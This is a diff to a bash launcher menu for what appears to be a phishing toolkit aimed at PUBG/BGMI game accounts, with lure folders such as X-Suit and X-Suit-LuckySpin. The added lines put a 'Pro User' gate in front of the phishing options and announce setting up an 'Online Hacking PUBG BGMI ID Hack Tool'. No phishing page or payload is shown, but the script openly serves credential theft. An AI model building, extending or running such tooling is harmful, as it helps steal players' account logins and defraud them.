@@ -41,6 +41,23 @@ echo ""
                            cd SUMAN/ 
                            cd X-Suit/
 			   echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Only Pro User tool\e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
@@ -452,6 +469,23 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                 
                            cd SUMAN1/
                            cd X-Suit-LuckySpin/
+			   echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Only Pro User tool\e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
                            echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
